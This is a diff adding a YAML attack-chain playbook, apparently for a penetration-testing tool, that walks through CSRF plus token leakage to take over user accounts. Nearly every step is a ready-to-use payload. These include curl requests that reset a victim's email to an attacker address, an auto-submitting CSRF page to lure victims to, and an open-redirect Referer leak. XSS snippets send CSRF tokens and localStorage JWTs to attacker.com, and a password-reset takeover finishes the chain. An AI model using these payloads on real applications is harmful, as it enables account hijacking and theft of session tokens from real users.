@@ -1,0 +1,96 @@
+id: csrf-and-token-leak
+name: "Web — CSRF + session/token leakage chain"
+description: >
+  CSRF lets you force an authenticated victim to perform actions; on its
+  own it's auth-bypass-by-impersonation. Combined with a token leak
+  (Referer header, XSS, postMessage origin checks) it becomes account
+  takeover.
+tags: [web, csrf, xss, token-leak, account-takeover]
+difficulty: medium
+
+inputs:
+  - name: target_app
+    description: "Base URL of the vulnerable app."
+    required: true
+
+steps:
+  - id: csrf_probe
+    name: "Identify state-changing endpoints + check CSRF protection"
+    inline_command: |
+      # Find POST / PUT / DELETE endpoints with no CSRF token requirement.
+      # Indicators: no X-CSRF-Token header, no SameSite cookie attribute,
+      # no anti-CSRF input in forms.
+      curl -X POST '<app>/change-email' \
+        -H 'Cookie: session=<victim_session_if_known>' \
+        -d 'new_email=attacker@evil.com'
+    inputs:
+      app: "${target_app}"
+    notes: |
+      If state changes WITHOUT a corresponding token check → vulnerable.
+
+  - id: craft_csrf_payload
+    name: "Craft auto-submitting HTML CSRF payload"
+    inline_command: |
+      cat > csrf.html <<'EOF'
+      <html><body onload="document.forms[0].submit()">
+      <form action="<app>/change-email" method="POST">
+        <input name="new_email" value="attacker@evil.com">
+      </form>
+      </body></html>
+      EOF
+      python3 -m http.server 8080
+      # Host on attacker box; lure victim to fetch http://<attacker>:8080/csrf.html.
+    inputs:
+      app: "${target_app}"
+    notes: |
+      Combine with XSS on a sibling host to remove the need for a click —
+      auto-fires when the user visits ANY page on the compromised origin.
+
+  - id: token_via_referer
+    name: "Leak CSRF token via Referer header (open redirect)"
+    inline_command: |
+      # Some apps put the token in the URL. Open redirect on the app:
+      curl '<app>/redirect?url=http://attacker.com'
+      # The victim's browser sends Referer: <app>/page?csrf_token=XYZ
+      # Capture in your access log.
+
+  - id: token_via_xss
+    name: "Leak token via XSS (any reflected XSS works)"
+    inline_command: |
+      # Inject:
+      # <script>
+      # fetch('<app>/csrf-form').then(r=>r.text()).then(t=>{
+      #   const tok = t.match(/csrf_token\\s*=\\s*"([^"]+)"/)[1];
+      #   fetch('http://attacker.com/?t=' + tok);
+      # })
+      # </script>
+
+  - id: jwt_in_localstorage
+    name: "JWT in localStorage → grab via XSS"
+    inline_command: |
+      # <script>fetch('http://attacker.com/?t='+localStorage.getItem('jwt'))</script>
+      # Stolen JWT → use directly in Authorization: Bearer header.
+      # See the jwt-attacks chain to see if it can be forged anew.
+
+  - id: account_takeover
+    name: "Use captured token / changed email to fully take over"
+    inline_command: |
+      # 1) Triggered email change → request password reset → land in attacker inbox.
+      curl -X POST '<app>/forgot-password' -d 'email=attacker@evil.com'
+      # 2) Click the reset link → set new password → logged in as the victim.
+    inputs:
+      app: "${target_app}"
+
+references:
+  - title: "PortSwigger — CSRF"
+    url:   "https://portswigger.net/web-security/csrf"
+  - title: "HackTricks — CSRF"
+    url:   "https://book.hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html"
+
+next_chains:
+  - chain: file-upload-bypass
+    when:   'logged in as admin'
+    reason: 'Admin panels usually expose uploads.'
+  - chain: jwt-attacks
+    when:   'JWT stolen via XSS'
+    reason: 'Try forging stronger tokens with the same secret.'
